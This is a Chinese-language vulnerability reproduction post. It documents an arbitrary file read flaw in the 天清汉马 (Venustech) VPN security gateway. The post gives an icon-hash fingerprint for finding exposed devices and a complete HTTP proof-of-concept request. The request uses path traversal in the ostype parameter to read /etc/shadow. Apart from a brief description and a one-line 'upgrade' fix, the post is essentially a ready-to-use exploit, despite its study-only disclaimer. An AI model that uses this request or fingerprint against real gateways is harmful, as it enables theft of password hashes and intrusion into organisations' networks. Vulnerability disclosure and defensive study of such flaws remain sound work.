#  天清汉马VPN安全网关系统任意文件读取漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-02-28 04:54  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何  
直接或者间接的后  
果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
  
01  
  
—  
  
漏洞名称  
#   
# 天清汉马VPN安全网关系统任意文件读取漏洞  
#   
  
02  
  
—  
  
影响版本  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1tria0TTYt6ZA3R8bia8jENsjZyibIeyEOyHZJPqTsUjuQPRxHWaotDo1t92ibOrtiapvMvVVQOVRfupDyYT4yyreKNHm7mqj4PGuA/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2JLwfE95nFO5P4ES34pkvffzgicCjucoHxxFKjp6RibnasicUqQgFXONXGYW5j09CV2sSIDibKwicFncvFWOMA89QNRlN1zxFaYbVo/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
天清汉马VPN  
安全网关系统是启明星辰集团旗下天清汉马品牌推出的网络安全设备，主要提供安全的远程接入和分支机构互联解决方案。  
天清汉马VPN安全网关系统的任意文件读取漏洞，是指攻击者可通过特定构造的请求，读取服务器上的敏感文件，如配置文件、账号密码等，从而获取系统权限或进一步渗透内网。  
  
04  
  
—  
  
资产测绘  
```
icon_hash="-15980305"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3HtExpYWZQ8icrkwndp3G1Qh3u1aTTYUypf4ibqpIcxWIaGWVgdicicFInGxmd9flwNT61lOv2jeqv6ncYXsq457VEibqvslBn0Lx4/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /vpn/user/download/client?ostype=../../../../../../../etc/shadow HTTP/1.1
Host: 127.0.0.1
Connection: close
sec-ch-ua-platform: "Windows"
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
sec-ch-ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty

Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: VSG_VERIFYCODE_CONF=0-0; VSG_CLIENT_RUNNING=false; VSG_LANGUAGE=zh_CN
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0H1a1nS8gB3AYI8rN6IicZXFtbGUoAng5ibxG5AO9F6NaICibqEQ4u8w11bHJlS99rhc2v9M89Qa3JiadKoasuvkqZUjdtlc33mqk/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级至最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
